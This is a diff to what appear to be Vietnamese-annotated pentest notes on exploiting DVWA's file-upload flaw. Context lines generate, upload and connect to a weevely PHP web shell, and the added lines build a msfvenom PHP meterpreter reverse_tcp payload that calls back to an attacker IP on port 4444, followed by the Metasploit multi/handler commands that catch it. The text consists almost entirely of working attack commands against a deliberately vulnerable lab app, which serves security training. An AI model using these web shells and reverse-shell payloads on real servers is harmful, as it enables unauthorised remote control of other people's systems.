@@ -107,6 +107,15 @@ weevely generate <pwd> weevely.php
 subl weevely.php	/ nano weevely.php						(kiểm ra ipattacker xem đúng chưa và sau đó upload lên)
 http://<ipaddr>/dvwa/vulnerabilities/upload/...../hackable/uploads/weevely.php
 weevely http://<ipaddr>/dvwa/hackable/uploads/weevely.php <pwd> 		(sau đó có thể dùng đc cmd/shell)
+--------------------------------------------------------------------------------------------------------------------
+msfvenom ‐p php/meterpreter/reverse_tcp LHOST=<ipattacker> LPORT=4444 ‐f raw > exploit.php
+
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST <ipattacker>
+set LPORT 4444
+exploit
+
 ```
 <img width="700" height="300" alt="Screenshot 2026-03-19 at 18 50 57" src="https://github.com/user-attachments/assets/4b16bb5f-392e-490c-a687-655c253bd50c" />
 
